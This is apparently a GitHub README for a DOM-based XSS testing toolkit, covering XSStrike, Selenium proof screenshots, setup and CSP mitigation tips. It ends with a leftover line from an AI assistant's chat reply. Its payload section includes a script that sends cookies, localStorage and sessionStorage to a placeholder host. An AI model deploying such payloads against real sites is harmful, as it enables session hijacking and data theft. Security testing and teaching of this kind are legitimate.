# DOM-XSS-Toolkit 🛡

A practical toolkit for detecting and demonstrating DOM-based Cross-Site Scripting (XSS) vulnerabilities using Python, Selenium, and XSStrike in Kali Linux.

## 🔍 What is DOM XSS?

DOM XSS occurs when client-side JavaScript processes untrusted input (like URL fragments or local storage) and injects it into the DOM without proper sanitization. Unlike reflected or stored XSS, DOM XSS is invisible to the server and harder to detect.

## 🧰 Tools Used

- **XSStrike** – DOM and reflected XSS scanner
- **Python + Selenium** – Automated browser testing and payload injection
- **Chromium Driver** – Headless browser for proof-of-concept
- **Kali Linux** – Testing environment

## 🚀 Features

- Detect missing or weak Content-Security-Policy (CSP) headers
- Inject and test DOM-based XSS payloads via URL fragments
- Capture screenshots as proof of execution
- Encode payloads for safe injection
- Log cookies, localStorage, and sessionStorage via fetch-based payloads

## 🧪 Example Payloads

### Basic Alert
html
<script>alert('XSS')</script>


### Encoded Fragment Injection

https://target.com/page#%3Cscript%3Ealert('XSS')%3C%2Fscript%3E


### Data Exfiltration
html
<script>
fetch("https://your-server.com/log", {
  method: "POST",
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
  }),
  headers: { "Content-Type": "application/json" }
});
</script>


## 🖼 Screenshot Proof

Use `dom_xss_test.py` to capture a screenshot of the browser after payload execution:
bash
python3 dom_xss_test.py

Saved as `dom_xss_proof.png`.

## 📦 Setup Instructions

bash
# Create and activate virtual environment
python3 -m venv xs_env
source xs_env/bin/activate

# Install dependencies
pip install selenium requests fuzzywuzzy python-Levenshtein

# Install Chromium driver
sudo apt install chromium-driver

## 🛡 Mitigation Tips

- Use strong CSP headers (avoid `unsafe-inline`, `unsafe-eval`)
- Sanitize all dynamic inputs in JavaScript
- Avoid unsafe sinks like `innerHTML`, `eval()`, `document.write()`

## 📚 References

- [XSStrike GitHub](https://github.com/s0md3v/XSStrike)
- [CSP Evaluator by Google](https://csp-evaluator.withgoogle.com)
- [MDN: Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

> ⚠ This toolkit is for educational and ethical testing only. Do not use it on systems without explicit permission.



---

Let me know if you'd like me to generate the Medium blog post next or help you publish this repo with a license and tags. You're building something seriously useful.
